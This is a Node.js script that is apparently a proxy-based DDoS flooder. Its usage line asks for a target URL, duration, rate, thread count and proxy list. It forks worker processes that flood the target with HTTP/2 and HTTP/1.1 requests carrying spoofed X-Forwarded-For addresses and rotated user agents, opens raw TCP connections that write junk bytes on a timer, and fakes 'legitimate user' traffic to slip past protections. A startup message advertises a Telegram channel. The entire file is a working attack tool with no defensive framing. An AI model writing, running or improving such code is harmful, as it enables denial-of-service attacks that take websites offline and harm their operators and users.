const net = require("net");
const http = require("http");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const axios = require('axios');
const https = require('https');
const Hpack = require('hpack');

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

if (process.argv.length < 7) {
    console.log(`
Usage: node script.js [target] [duration] [rate] [threads] [proxyFile] [--debug true/false]
Example: node script.js https://example.com 120 512 258 proxy.txt --debug true
    `);
    process.exit();
}

const targetURL = process.argv[2];
const parsedTarget = url.parse(targetURL);
const duration = parseInt(process.argv[3]);
const rate = parseInt(process.argv[4]);
const threads = parseInt(process.argv[5]);
const proxyFile = process.argv[6];
const debugMode = process.argv.includes('--debug') ? process.argv[process.argv.indexOf('--debug') + 1] === 'true' : false;
const proxies = fs.readFileSync(proxyFile, 'utf-8').split('\n');

function logDebug(message) {
    if (debugMode) {
        console.log(message);
    }
}

function getRandomIP() {
    return `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`;
}

function getRandomUserAgent() {
    const userAgents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36"
    ];
    return userAgents[Math.floor(Math.random() * userAgents.length)];
}

async function getWebsiteTitle() {
    try {
        const response = await axios.get(targetURL, { httpsAgent: new https.Agent({ rejectUnauthorized: false }) });
        const html = response.data;
        const titleMatch = html.match(/<title>(.*?)<\/title>/);
        return titleMatch ? titleMatch[1] : 'Unknown Title';
    } catch (error) {
        return 'Unknown Title';
    }
}

async function getWebsiteISP() {
    try {
        const response = await axios.get(`https://ipinfo.io/json`);
        return response.data.org || "Unknown ISP";
    } catch (error) {
        return "Unknown ISP";
    }
}

async function logBypassInformation(proxy, userAgent) {
    const title = await getWebsiteTitle();
    const isp = await getWebsiteISP();

    logDebug(`
        Proxies [${proxy}] has successfully bypassed and will flood. 
        Title: [${title}]. ISP: [${isp}]
    `);

    logDebug(`
        Useragents [${userAgent}] has successfully bypassed and will flood.
        Title: [${title}]. ISP: [${isp}]
    `);
}

function getRandomQueryString() {
    return `?v=${Math.random().toString(36).substring(7)}`;
}

function generateRandomizedHeaders(userAgent, cookie = '') {
    const headers = {
        "User-Agent": userAgent,
        "X-Forwarded-For": getRandomIP(),
        "X-Forwarded-Host": getRandomIP(),
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Sec-Fetch-Mode": "navigate",
        "Referer": `https://${parsedTarget.host}/`,
        "Upgrade-Insecure-Requests": "1"
    };

    if (cookie) {
        headers['Cookie'] = cookie;
    }

    return headers;
}

function extractCookies(headers) {
    const setCookie = headers['set-cookie'] || [];
    return setCookie.map(cookie => cookie.split(';')[0]).join('; ');
}

function encodeHeaders(headers) {
    const hpack = new Hpack.Encoder();
    const headerArray = Object.entries(headers).map(([key, value]) => [key, value]);
    return hpack.encode(headerArray);
}

function sendHttp2Request(proxy, headers, connection, cookie = '') {
    const client = http2.connect(targetURL, {
        createConnection: () => tls.connect({
            host: parsedTarget.host,
            ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256',
            servername: parsedTarget.host,
            socket: connection,
            rejectUnauthorized: false,
        }),
    });

    client.on('error', err => {
        client.destroy();
        connection.destroy();
    });

    const encodedHeaders = encodeHeaders(headers);
    const request = client.request(encodedHeaders);

    request.on('response', (headers) => {
        const statusCode = headers[':status'];

        if (statusCode === 429) {
            client.close();
            connection.destroy();
            return;
        }

        if (statusCode >= 300 && statusCode < 400 && headers['location']) {
            const redirectLocation = headers['location'];
            const newCookie = extractCookies(headers);

            logDebug(`Redirected to: ${redirectLocation} with cookies: ${newCookie}`);
            const newHeaders = generateRandomizedHeaders(getRandomUserAgent(), newCookie);
            sendHttp2Request(proxy, newHeaders, connection, newCookie);
        } else {
            const newCookie = extractCookies(headers);
            if (newCookie) {
                logDebug(`New cookies received: ${newCookie}`);
            }
        }
    });

    request.end();
}

function sendHttp11Request(proxy, headers, method) {
    const options = {
        hostname: parsedTarget.host,
        port: 80,
        path: parsedTarget.path + getRandomQueryString(),
        method: method,
        headers: headers
    };

    const req = http.request(options, (res) => {
        res.on('data', (chunk) => {});
        res.on('end', () => {
            const cookies = res.headers['set-cookie'] || [];
            if (cookies.length > 0) {
                logDebug(`New cookies received: ${cookies.join('; ')}`);
            }
        });
    });

    req.on('error', (e) => {
        console.error(`Problem with request: ${e.message}`);
    });

    req.end();
}

function tcpFlood(proxy) {
    const [proxyHost, proxyPort] = proxy.split(':');
    const client = net.createConnection({ host: proxyHost, port: parseInt(proxyPort) }, () => {
        logDebug(`TCP connection established to ${proxyHost}:${proxyPort}`);
        setInterval(() => {
            client.write('A'.repeat(1024));
        }, 100);
    });

    client.on('error', (err) => {
        console.error(`TCP connection error: ${err.message}`);
    });
}

async function simulateLegitimateUser() {
    const actions = [
        async () => axios.get(`${targetURL}${getRandomQueryString()}`, { httpsAgent: new https.Agent({ rejectUnauthorized: false }) }),
        async () => axios.post(`${targetURL}`, { data: getRandomQueryString() }, { httpsAgent: new https.Agent({ rejectUnauthorized: false }) }),
    ];

    const action = actions[Math.floor(Math.random() * actions.length)];
    try {
        await action();
    } catch (error) {
        console.error('Error simulating legitimate user:', error);
    }
}

async function startAttack() {
    logDebug('Attack Start');
    proxies.forEach(async proxy => {
        const [proxyHost, proxyPort] = proxy.split(':');
        const userAgent = getRandomUserAgent();
        const method = Math.random() > 0.5 ? 'GET' : 'POST';

        const headers = generateRandomizedHeaders(userAgent);

        await logBypassInformation(`${proxyHost}:${proxyPort}`, userAgent);

        const connection = net.connect({ host: proxyHost, port: parseInt(proxyPort) }, () => {
            if (Math.random() > 0.5) {
                sendHttp2Request(proxy, headers, connection);
            } else {
                sendHttp11Request(proxy, headers, method);
            }

            tcpFlood(proxy);
        });

        connection.on('error', err => {
            connection.destroy();
        });

        await simulateLegitimateUser();
    });
}

if (cluster.isMaster) {
	console.log('Attack Started | Join t.me/LIService')
    for (let i = 0; i < threads; i++) {
        cluster.fork();
    }
    setTimeout(() => {
        process.exit(0);
    }, duration * 1000);
} else {
    setInterval(startAttack, 1000 / rate);
}